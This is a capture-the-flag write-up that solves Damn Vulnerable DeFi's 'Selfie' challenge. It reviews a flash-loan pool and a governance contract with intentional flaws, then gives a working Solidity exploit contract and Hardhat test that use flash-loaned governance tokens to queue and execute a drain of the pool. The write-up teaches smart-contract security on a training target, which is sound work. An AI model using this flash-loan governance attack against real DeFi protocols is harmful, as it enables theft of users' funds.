@@ -1,0 +1,266 @@
+# Damn Vulnerable DeFi V2 - #6 Selfie
+
+<p className="text-xs text-right">February 21, 2022 by [patrickd](/about#patrickd)</p>
+
+This write-up continues the series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!
+
+---
+
+>[**Challenge #6 - Selfie**](https://www.damnvulnerabledefi.xyz/challenges/6.html)
+>
+>A new cool lending pool has launched! It's now offering flash loans of DVT tokens.
+>
+>Wow, and it even includes a really fancy governance mechanism to control it.
+>
+>What could go wrong, right ?
+>
+>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.
+
+## Code Review
+
+From the description alone it sounds like we might be able to take over the governance mechanism allowing us to approve a proposal that would drain the pool.
+
+But first, let's look at the [test cases](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/selfie/selfie.challenge.js) again to figure out the winning conditions.
+
+```javascript filename="selfie.challenge.js"
+const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
+const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
+
+before(async function () {
+    ...
+
+    this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
+    this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
+    this.pool = await SelfiePoolFactory.deploy(
+        this.token.address,
+        this.governance.address
+    );
+
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+
+    ...
+```
+
+The first contract that is deployed, sounds like a DVT token with [snapshot capabilities](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot). It immediately mints 2 million tokens of initial supply of which 1.5 million are transferred into the `SelfiePool`. And as expected it appears that the Damn Valuable Token, which is available for flash loaning through SelfiePool, is also used as the governance token.
+
+```javascript filename="selfie.challenge.js"
+after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Attacker has taken all tokens from the pool
+    expect(
+        await this.token.balanceOf(attacker.address)
+    ).to.be.equal(TOKENS_IN_POOL);
+    expect(
+        await this.token.balanceOf(this.pool.address)
+    ).to.be.equal('0');
+});
+```
+
+The challenge's success conditions are quite simply that all DVT have been moved from the pool and into the attacker EOA account.
+
+---
+
+A quick look into [DamnValuableTokenSnapshot.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/DamnValuableTokenSnapshot.sol) shows that the assumption of it being a simple [ERC20Snapshot token](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Snapshot.sol) was correct.
+
+Next, looking at [SelfiePool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/selfie/SelfiePool.sol) we see the same flash loaning pattern we've already seen in previous challenges but this time there's also a governance function:
+
+```solidity filename="SelfiePool.sol"
+modifier onlyGovernance() {
+    require(msg.sender == address(governance), "Only governance can execute this action");
+    _;
+}
+
+...
+
+function drainAllFunds(address receiver) external onlyGovernance {
+    uint256 amount = token.balanceOf(address(this));
+    token.transfer(receiver, amount);
+    ...
+```
+
+So it appears that there's already a quite (for our purposes) helpful fund draining function available that we can make use of once we've taken over control of the governance contract.
+
+[SimpleGovernance.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/selfie/SimpleGovernance.sol) has a bunch of new code that takes a bit to wrap your head around but the essential bits are the following:
+
+```solidity filename="SimpleGovernance.sol"
+contract SimpleGovernance {
+
+    ...
+
+    struct GovernanceAction {
+        address receiver;
+        bytes data;
+        ....
+    }
+
+    ...
+
+    mapping(uint256 => GovernanceAction) public actions;
+    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
+
+    ...
+
+    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
+        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
+        ...
+
+        GovernanceAction storage actionToQueue = actions[actionId];
+        actionToQueue.receiver = receiver;
+        actionToQueue.data = data;
+
+        ...
+    }
+
+    function executeAction(uint256 actionId) external payable {
+        require(_canBeExecuted(actionId), "Cannot execute this action");
+
+        ...
+
+        actionToExecute.receiver.functionCallWithValue(
+            actionToExecute.data, ...
+        );
+
+        ...
+    }
+
+    ...
+
+    /**
+     * @dev an action can only be executed if:
+     * 1) it's never been executed before and
+     * 2) enough time has passed since it was first proposed
+     */
+    function _canBeExecuted(uint256 actionId) private view returns (bool) {
+        ...
+    }
+
+    function _hasEnoughVotes(address account) private view returns (bool) {
+        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
+        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+        return balance > halfTotalSupply;
+    }
+}
+```
+
+In order to successfully queue an action, we have to own more than half of the total supply (1 million DVT + 1wei). Since there's nothing checking that we didn't borrow them using a flash loan this can be quite easily bypassed.
+
+We can't immediately execute the action though since there's a delay of 2 days we have to wait first. But all we have to do here is fast forward the time by 2 days since there's nothing ensuring that we still hold those governance tokens during the delay.
+
+For calling `queueAction()` we know that the `receiver` we want to call is the SimplePool contract but we have to build the calldata that is passed to it, which is the 4-byte function signature of `drainAllFunds(address)` + the function parameters: the receiver that the funds should be drained to, the attacker account's address. We'll be returned an `actionId` which we can then later pass into `executeAction()` once the delay time has passed.
+
+## Exploit
+
+```solidity filename="SelfieExploit.sol"
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISimpleGovernance {
+    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
+    function executeAction(uint256 actionId) external payable;
+}
+
+interface ISelfiePool {
+    function flashLoan(uint256 borrowAmount) external;
+}
+
+interface IFlashLoanReceiver {
+    function receiveTokens(address token, uint256 amount) external;
+}
+
+interface IDVTSnapshot {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function snapshot() external returns (uint256);
+}
+
+contract SelfieExploit is IFlashLoanReceiver {
+    address immutable attacker;
+    ISimpleGovernance immutable governance;
+    ISelfiePool immutable pool;
+    uint256 actionId;
+    constructor(ISimpleGovernance _governance, ISelfiePool _pool) {
+        attacker = msg.sender;
+        governance = _governance;
+        pool = _pool;
+    }
+
+    // 1. Flash loan enough governance tokens to queue drain action.
+    function takeoverGov(uint256 amount) external {
+        // Flash loan more than half of all DVT tokens.
+        pool.flashLoan(amount); // Triggers receiveTokens()
+    }
+    function receiveTokens(address token, uint256 amount) override external {
+        // Having a majority of governance tokens at this moment, create a snapshot.
+        IDVTSnapshot(token).snapshot();
+        // Queue a proposal to drain funds.
+        actionId = governance.queueAction(
+            address(pool),
+            abi.encodeWithSignature(
+                "drainAllFunds(address)",
+                attacker
+            ),
+            0
+        );
+        // Pay back flash loan.
+        IDVTSnapshot(token).transfer(address(pool), amount);
+    }
+
+    // 2. After waiting for the action delay to have passed, execute it.
+    function drainToAttacker() external {
+        governance.executeAction(actionId);
+    }
+
+}
+```
+
+Now adjust the [selfie.challenge.js](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/selfie/selfie.challenge.js) file to deploy the exploit contract and execute its function with sufficient delay for the queued action to be executed:
+
+
+```javascript
+it('Exploit', async function () {
+    // Deploy exploit contract.
+    const ExploitFactory = await ethers.getContractFactory('SelfieExploit', attacker);
+    const exploit = await ExploitFactory.deploy(this.governance.address, this.pool.address);
+
+    // 1. Flash loan enough governance tokens to queue drain action.
+    await exploit.takeoverGov(TOKENS_IN_POOL);
+
+    // Simulate waiting for the action delay to pass.
+    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+    // 2. After waiting for the action delay to have passed, execute it.
+    await exploit.drainToAttacker();
+});
+```
+
+After initially creating the exploit I ran into the following error:
+
+```bash
+  1) [Challenge] Selfie
+       Exploit:
+     Error: VM Exception while processing transaction: reverted with reason string 'ERC20Snapshot: id is 0'
+```
+
+This was because I assumed that the governance contract would automatically create the snapshot of governance tokens before calling `_hasEnoughVotes()`, which uses the latest snapshot to determine governance token balances.
+
+The solution was to simply call `IDVTSnapshot(token).snapshot();{:solidity}` to create that snapshot before calling `queueAction()` where it'll be used in.
+
+```bash
+ubuntu@damnvulndefi:~/damn-vulnerable-defi$ yarn run selfie
+yarn run v1.22.17
+$ yarn hardhat test test/selfie/selfie.challenge.js
+$ /home/ubuntu/damn-vulnerable-defi/node_modules/.bin/hardhat test test/selfie/selfie.challenge.js
+
+
+  [Challenge] Selfie
+    ✓ Exploit (114ms)
+
+
+  1 passing (950ms)
+
+Done in 2.04s.
+```
+
+## Conclusion
+
+Flash loaning governance tokens in order to manipulate a DAO has happened in the real world several times and there are now various established ways to prevent this from happening. But before building your governance system and figuring out all these intricacies on your own, instead consider using one of the governance contracts that are publicly available and well tested like [OpenZeppelin's Governor](https://blog.openzeppelin.com/governor-smart-contract/) which even has an interactive [contract creation wizard](https://wizard.openzeppelin.com/#governor). More information in regards to securing governance protocols can be found in the [Strategies for Secure Governance with Smart Contracts](https://www.youtube.com/watch?v=GbDAmMdmh8Q) workshop.
